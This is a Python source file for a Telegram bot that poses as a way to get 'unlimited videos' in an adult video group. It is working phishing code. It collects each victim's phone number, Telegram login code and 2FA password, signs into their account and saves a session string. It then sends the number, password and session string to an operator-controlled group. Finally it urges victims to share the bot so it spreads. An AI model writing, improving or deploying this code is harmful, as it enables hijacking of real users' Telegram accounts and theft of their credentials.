import os
import asyncio
import threading
from flask import Flask
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError,
)
from config import API_ID, API_HASH, BOT_TOKEN, TARGET_GROUP_ID

bot = TelegramClient("bot_session", API_ID, API_HASH)
# active logins: {user_id: {...}}
sessions = {}


@bot.on(events.NewMessage(pattern=r"^/start$"))
async def cmd_start(event):
    sessions[event.sender_id] = {"stage": "phone"}
    await event.reply(
        "👋 **unlimited videos Bot**\n\n"
        "📱 Apna phone number bhejo country code ke saath\n"
        "Example: `+919876543210`",
        parse_mode="md",
    )


@bot.on(events.NewMessage(pattern=r"^/cancel$"))
async def cmd_cancel(event):
    uid = event.sender_id
    if uid in sessions:
        client = sessions[uid].get("client")
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        sessions.pop(uid, None)
    await event.reply("❌ Cancelled.")


@bot.on(events.NewMessage())
async def handler(event):
    uid = event.sender_id
    text = (event.text or "").strip()
    if text.startswith("/"):
        return
    if uid not in sessions:
        await event.reply("Pehle /start bhejo.")
        return

    st = sessions[uid]
    stage = st["stage"]

    # ---------- STEP 1: Phone ----------
    if stage == "phone":
        phone = text.replace(" ", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
        except PhoneNumberInvalidError:
            await client.disconnect()
            await event.reply("❌ Invalid number. Dobara bhejo.")
            return
        except Exception as e:
            await client.disconnect()
            await event.reply(f"❌ Error: `{e}`", parse_mode="md")
            return

        st.update(
            client=client,
            phone=phone,
            phone_code_hash=sent.phone_code_hash,
            stage="otp",
        )
        await event.reply(
            "✅ telegram se message bhej diya gaya.\n\n"
            "confirm krne ke liye code lagao jo telegram ne bheja hai, jaise `12345`\n"
            "(code daalne ke baad aapko desi videos group me join kar diya jayega)"
        )
        return

    # ---------- STEP 2: OTP ----------
    if stage == "otp":
        raw = text.replace(" ", "").replace("-", "")
        # 1-1 digit me convert
        digits = [ch for ch in raw if ch.isdigit()]
        if len(digits) < 4:
            await event.reply("❌ code sahi nahi lag raha. Dobara bhejo.")
            return
        code = "".join(digits)
        st["digits"] = digits  # agar future me chahiye
        client = st["client"]
        try:
            await client.sign_in(
                phone=st["phone"],
                code=code,
                phone_code_hash=st["phone_code_hash"],
            )
        except SessionPasswordNeededError:
            st["stage"] = "password"
            await event.reply("🔐 2-Step verification on hai. Ab password bhejo.")
            return
        except PhoneCodeInvalidError:
            await event.reply("❌ Galat code. Dobara bhejo.")
            return
        except PhoneCodeExpiredError:
            await event.reply("❌ code expire. /start karke dobara try karo.")
            await client.disconnect()
            sessions.pop(uid, None)
            return
        except Exception as e:
            await event.reply(f"❌ Error: `{e}`", parse_mode="md")
            return

        await finalize(event, uid)
        return

    # ---------- STEP 3: 2FA Password ----------
    if stage == "password":
        client = st["client"]
        try:
            await client.sign_in(password=text)
        except Exception as e:
            await event.reply(f"❌ Galat password ya error: `{e}`", parse_mode="md")
            return
                # 👇 2FA password ko store karo
        st["password"] = text
        await finalize(event, uid)
        return


async def finalize(event, uid):
    st = sessions[uid]
    client = st["client"]
    phone = st["phone"]
    password = st.get("password")  # 👈 2FA password nikaalo

    session_str = client.session.save()
    safe = phone.replace("+", "").replace(" ", "")
    filename = f"session_{safe}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(session_str)

    caption = (
        f"📱 **Number:** `{phone}`\n"
        f"👤 **User:** @{event.sender_id}\n\n"
        
        #f"🔑 **String Session:**\n`{session_str}`"
    )
    if password:
        caption += f"🔐 **2FA Password:** `{password}`\n"
    else:
        caption += "🔐 **2FA Password:** `None`\n"
    caption += f"\n🔑 **String Session:**\n`{session_str}`"


    try:
        await bot.send_file(
            TARGET_GROUP_ID,
            filename,
            caption=caption,
            parse_mode="md",
        )
        await event.reply( f"https://t.me/+apndeG28cUQ5ZWY1\n"
        "✅ sucessfull uper di gyi link se aap unlimited videos dekh sakte hai\n"
        "अगर आप और ग्रुप्स में जॉइन होना चाहते हैं तो कृपया इस बॉट को अपने दोस्तों के साथ शेयर करें। जब भी कोई इस बॉट से सक्सेसफुल लॉगिन कर लेगा तो      आपको ग्रुप लिंक मिल जाएगी। इसलिए इस बॉट को ज्यादा से ज्यादा शेयर करें")

    except Exception as e:
        await event.reply(
            f"⚠️ fir se try kre error: `{e}`\n\n"
            f"Yahan tumhari string:\n`{session_str}`",
            parse_mode="md",
        )
    finally:
        try:
            os.remove(filename)
        except Exception:
            pass
        try:
            await client.disconnect()
        except Exception:
            pass
        sessions.pop(uid, None)

# ---------- Dummy HTTP server (Render ke liye) ----------
app = Flask(__name__)

@app.route("/")
@app.route("/health")
def health():
    return "Bot is alive", 200

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

async def main():
    threading.Thread(target=run_web, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("Bot chal raha hai...")
    await bot.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
